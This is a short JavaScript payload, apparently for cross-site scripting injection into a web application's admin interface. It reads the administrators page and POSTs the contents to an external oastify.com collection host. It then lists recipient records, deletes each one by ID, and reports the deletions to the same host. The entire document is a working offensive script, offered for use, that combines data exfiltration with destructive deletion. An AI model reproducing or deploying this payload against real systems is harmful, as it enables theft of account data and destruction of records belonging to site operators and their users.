// CONFIGURE YOUR EXFIL DOMAIN HERE:
const exfilURL = 'https://pyrcndfj7kdinpryfdwv9b06mxsogt4i.oastify.com';

// 1. Exfiltrate Admins
fetch('/en/users/administrators')
  .then(r => r.text())
  .then(adminData => {
    fetch(exfilURL, {
      method: 'POST',
      body: '[ADMINS]\\n' + adminData,
      headers: { 'Content-Type': 'text/plain' }
    });
  });

// 2. Get Recipients, Extract IDs, Delete
fetch('/recipients/datatables/list?draw=1&start=0&length=100')
  .then(r => r.json())
  .then(data => {
    data.data.forEach(user => {
      const id = user.Recipient_ID;
      if (id) {
        // Delete user
        fetch(`/en/users/recipients/${id}/delete`);

        // Optional: Log deletion
        fetch(exfilURL, {
          method: 'POST',
          body: `[DELETED] ${id}`,
          headers: { 'Content-Type': 'text/plain' }
        });
      }
    });
  });
